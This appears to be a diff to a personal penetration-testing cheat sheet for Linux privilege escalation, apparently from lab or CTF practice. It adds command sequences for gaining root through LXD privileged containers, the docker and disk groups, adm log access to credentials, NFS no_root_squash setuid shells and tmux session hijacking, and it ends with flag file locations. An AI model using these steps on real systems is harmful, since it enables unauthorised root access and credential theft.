@@ -125,3 +125,78 @@ gcc src.c -fPIC -shared -o /development/libshared.so
 
 # LDC/LXC
 ---
+Unxip the alpine image:
+```shell
+unzip alpine.zip
+```
+
+Start the lxd initialization:
+```shell
+lxd init
+```
+
+Import the local image:
+```shell
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+```
+
+Start a privileged container:
+```shell
+lxc init alpine r00t -c security.privileged=true
+```
+
+Mount the host file system:
+```shell
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+```
+
+Start the container instance and run a root shell:
+```shell
+lxc start r00t
+lxc exec r00t /bin/sh
+```
+
+# Docker
+---
+Members of the docker group can create privileged containers and mount to the root of the filesystem:
+```shell
+docker run -v /root:/mnt -it ubuntu
+```
+
+# Disk
+---
+Members of the disk group have full access to devices in /dev (like /dev/sda1) and can therefore access the entire filesystem:
+```shell
+debugfs
+```
+
+# ADM
+---
+Members of the adm group can read logs in /var/logs, which often contain credentials:
+```shell
+find /var/log --group adm
+```
+
+# Weak NFS Privileges
+---
+Some volumes may have been created with the no_root_squash flag, which allows low-privileged users to create files as the root user:
+```shell
+cat /etc/exports
+gcc shell.c -o shell
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+./shell
+```
+
+# Hijacking Tmux Sessions
+---
+Some tmux sessions may still be running as a privileged and can be hijacked:
+```shell
+ps aux | grep tmux
+ls -la /shareds
+tmux -S /shareds
+```
+/home/barry/flag2.txt
+flag3 in /var/log/tomcat
+flag4 in /var/lib/tomcat9/
